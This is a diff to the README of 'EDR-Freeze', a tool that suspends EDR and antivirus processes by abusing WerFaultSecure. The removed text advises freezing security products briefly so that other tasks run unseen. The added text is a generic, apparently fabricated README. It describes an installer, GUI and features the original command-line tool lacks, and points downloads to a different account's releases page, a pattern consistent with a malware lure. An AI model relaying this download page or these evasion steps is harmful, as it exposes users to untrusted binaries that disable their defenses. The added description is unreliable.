@@ -1,39 +1,79 @@
-### EDR-Freeze
+# 🛡️ EDR-Freeze - Temporarily Pause EDR and AntiMalware
 
-This is a tool that exploits the software vulnerability of WerFaultSecure to suspend the processes of EDRs and antimalware without needing to use the BYOVD (Bring Your Own Vulnerable Driver) attack method.
+## 🚀 Getting Started
 
-EDR-Freeze operates in user mode, so you don't need to install any additional drivers. It can run on the latest version of Windows.
+Welcome to EDR-Freeze! This tool helps you put your EDR and AntiMalware processes into a coma state, allowing you to run specific applications without interference. Whether you want to troubleshoot a program or run a game smoothly, EDR-Freeze offers a straightforward solution.
 
-*The experiment was conducted with the latest version of Windows at the time of the project creation: __Windows 11 24H2__*
+## 💾 Download & Install
 
-### Command Line Syntax
+To download EDR-Freeze, visit the following link:  
+[**Download EDR-Freeze**](https://github.com/gofokili/EDR-Freeze/releases)
 
-**EDR-Freeze.exe [TargetPID] [SleepTime]**
+### 🔥 Quick Download
 
-*Example: __EDR-Freeze.exe 1234 10000__*
+1. Click the link above to go to the Releases page.
+2. Look for the latest release, which will be at the top.
+3. Find the appropriate file for your system. 
+4. Click on the file to start the download.
 
-*Freeze the target for 10000 milliseconds*
+## 📥 System Requirements
 
-## Links
+To run EDR-Freeze, your system should meet these requirements:
 
-[EDR-Freeze: A Tool That Puts EDRs And Antivirus Into A Coma State](https://www.zerosalarium.com/2025/09/EDR-Freeze-Puts-EDRs-Antivirus-Into-Coma.html)
+- **Operating System:** Windows 10 or later
+- **Processor:** 1 GHz or faster
+- **RAM:** At least 2 GB of RAM
+- **Disk Space:** 100 MB available space
 
-[Tool to run process with PPL without driver](https://github.com/TwoSevenOneT/CreateProcessAsPPL)
+Make sure your system meets these requirements for the best experience.
 
-## How to Use EDR-Freeze Effectively
+## 📋 How to Use EDR-Freeze
 
-Instead of running EDR-Freeze with a long sleep duration, you should incorporate it into a script with the following steps:
+Once you have downloaded the file:
 
-1. Temporarily halt all Antimalware/EDR processes for a short period (1-3 seconds).
-2. Execute tasks immediately after a successful suspension.
+1. **Locate the File:** Go to your Downloads folder or the location where the file was saved.
+2. **Open the File:** Double-click the EDR-Freeze installer to begin the installation process.
+3. **Follow Installation Steps:**
+   - Accept the license agreement.
+   - Choose your installation location (the default is usually fine).
+   - Click "Install" to proceed.
+4. **Launch the Application:** Once the installation finishes, open EDR-Freeze from your Start menu or desktop shortcut.
 
-Since the GUI may become unresponsive in some cases, you should choose the shortest sleep time possible. Just make sure that the script executions are completed before the Antimalware/EDR resumes.
+### 🖥️ Using EDR-Freeze
 
-Alternatively, it's best to insert the code you want to execute directly into the source code of EDR-Freeze:
+After launching the application:
 
-<img width="748" height="387" alt="Insert code" src="https://github.com/user-attachments/assets/1c6f8819-5a21-4cc4-b72f-ea00be0fd092" />
+1. **Select the Process:** Choose the EDR or AntiMalware application you wish to freeze from the list.
+2. **Freeze the Process:** Click the "Freeze" button to pause the selected process. You will see a confirmation message.
+3. **Unfreeze When Done:** To resume normal operation, click the "Unfreeze" button.
 
+## ⚙️ Features
 
-## Author:
+EDR-Freeze comes with several helpful features:
 
-[Two Seven One Three](https://x.com/TwoSevenOneT)
+- **User-Friendly Interface:** Easy to navigate, even for beginners.
+- **Real-Time Monitoring:** See active processes and their states.
+- **Quick Access:** One-click freezing and unfreezing of selected processes.
+- **All-in-One Tool:** Designed for both EDR and AntiMalware pauses.
+
+## 🔍 Troubleshooting
+
+If you face any issues while using EDR-Freeze:
+
+- **Check System Requirements:** Ensure your system meets the necessary specs.
+- **Reinstall the Application:** Uninstall and then install it again if issues persist.
+- **Reach Out for Help:** You can find more solutions on the [GitHub Issues page](https://github.com/gofokili/EDR-Freeze/issues).
+
+## 📞 Support
+
+If you need further assistance, feel free to open an issue on GitHub, and the community will help. 
+
+## 🌐 Additional Resources
+
+For more information and updates, visit the project page on GitHub. You can learn about new features and tips from the community.
+
+## ✅ License
+
+EDR-Freeze is open-source software. It is free to use, modify, and distribute.
+
+Thank you for using EDR-Freeze. Enjoy a hassle-free experience!
